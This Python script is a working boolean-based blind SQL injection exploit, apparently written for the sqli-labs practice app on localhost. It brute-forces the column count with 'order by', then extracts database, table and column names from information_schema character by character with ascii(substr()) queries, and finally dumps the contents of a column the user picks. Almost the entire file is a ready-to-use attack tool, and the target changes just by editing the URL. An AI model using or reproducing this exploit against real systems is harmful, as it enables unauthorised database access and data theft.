import requests as req
from time import sleep
from utils.standardHeaders import standardHeader
from utils.normal import sqlForce

baseurl = 'http://127.0.0.1:81/Less-8/?id=1'
# less5:'  less6:"  less7:'))  less8:'
poc = '\''
delayBetweenRequests = 0


def get(url, header=standardHeader):
    res = req.get(url, headers=header)
    sleep(delayBetweenRequests)
    return res

def checkRes(res, okText):
    if okText in res:
        return True
    else:
        return False


def confirmPosition(pocUrl, okText):
    print("Checking the columns of API result")
    checkUrl = pocUrl + " order by "
    for i in range(1, 100):
        res = get(checkUrl + str(i) + " -- -")
        if not checkRes(res.text, okText):
            return i-1


def forceDatabases(pocUrl, okText):
    payload = "(select group_concat(schema_name) from information_schema.schemata)"
    print("Forcing database length")
    for databaseConcatLength in range(50,9999):
        expUrl = pocUrl + ' and length({})>{} -- -'.format(payload, str(databaseConcatLength))
        res = get(expUrl)
        if not checkRes(res.text, okText):
            print("Database length is {}\nForcing each char".format(databaseConcatLength))
            allDatabases = ''
            payload = "and ascii(substr(" + payload + ",{},1))={} -- -"
            for index in range(1,databaseConcatLength+1):
                for char in sqlForce:
                    expUrl = pocUrl + payload.format(str(index), ord(char))
                    res = get(expUrl)
                    # print(expUrl)
                    if checkRes(res.text, okText):
                        allDatabases = allDatabases + char
                        print(allDatabases)
                        break
            return allDatabases


def forceTables(pocUrl, database, okText):
    payload = "(select group_concat(table_name) from information_schema.tables where table_schema=\'{}\')".format(database)
    s = " union select 1,2,{} limit 1,1 -- -"
    print("Forcing all tables' length")
    for tableConcatLength in range(1, 9999):
        expUrl = pocUrl + ' and length({})>{} -- -'.format(payload, str(tableConcatLength))
        res = get(expUrl)
        if not checkRes(res.text, okText):
            print("table length is {}\nForcing each char".format(tableConcatLength))
            allTables = ''
            payload = "and ascii(substr(" + payload + ",{},1))={} -- -"
            for index in range(1,tableConcatLength+1):
                for char in sqlForce:
                    expUrl = pocUrl + payload.format(str(index), ord(char))
                    res = get(expUrl)
                    # print(expUrl)
                    if checkRes(res.text, okText):
                        allTables = allTables + char
                        print(allTables)
                        break
            return allTables


def forceColumns(pocUrl, table, okText):
    payload = "(select group_concat(column_name) from information_schema.columns where table_name='{}')".format(table)
    print("Forcing all columns' length")
    for columnConcatLength in range(1, 9999):
        expUrl = pocUrl + ' and length({})>{} -- -'.format(payload, str(columnConcatLength))
        res = get(expUrl)
        if not checkRes(res.text, okText):
            print("columns length is {}\nForcing each char".format(columnConcatLength))
            allColumns = ''
            payload = "and ascii(substr(" + payload + ",{},1))={} -- -"
            for index in range(1, columnConcatLength + 1):
                for char in sqlForce:
                    expUrl = pocUrl + payload.format(str(index), ord(char))
                    res = get(expUrl)
                    # print(expUrl)
                    if checkRes(res.text, okText):
                        allColumns = allColumns + char
                        print(allColumns)
                        break
            return allColumns


def dumpData(pocUrl, okText, database, table, column):
    payload = "(select group_concat({}) from {}.{})".format(column, database, table)
    print("Forcing all data's length")
    for dataConcatLength in range(1, 9999):
        expUrl = pocUrl + ' and length({})>{} -- -'.format(payload, str(dataConcatLength))
        res = get(expUrl)
        # print(expUrl)
        if not checkRes(res.text, okText):
            print("data length is {}\nForcing each char".format(dataConcatLength))
            allData = ''
            payload = "and ascii(substr(" + payload + ",{},1))={} -- -"
            for index in range(1,dataConcatLength+1):
                for char in sqlForce:
                    expUrl = pocUrl + payload.format(str(index), ord(char))
                    res = get(expUrl)
                    # print(expUrl)
                    if checkRes(res.text, okText):
                        allData = allData + char
                        print(allData)
                        break
            return allData


if __name__ == '__main__':
    okText = 'You are in'
    res = get(baseurl)
    positionCount = confirmPosition(baseurl+poc, okText)
    print('There are {} positions'.format(positionCount))
    position = ''
    for i in range(1, positionCount):
        position = position + str(i) + ','
    databases = forceDatabases(baseurl+poc, okText)
    print('Input a database to force all tables:')
    database = input()
    tables = forceTables(baseurl+poc, database, okText)
    print('Input a table to force all columns:')
    table = input()
    columns = forceColumns(baseurl+poc, table, okText)
    print('Input a column to force all data:')
    dumpColumn = input()
    data = dumpData(baseurl+poc, okText, database=database, table=table, column=dumpColumn)
    print(data)
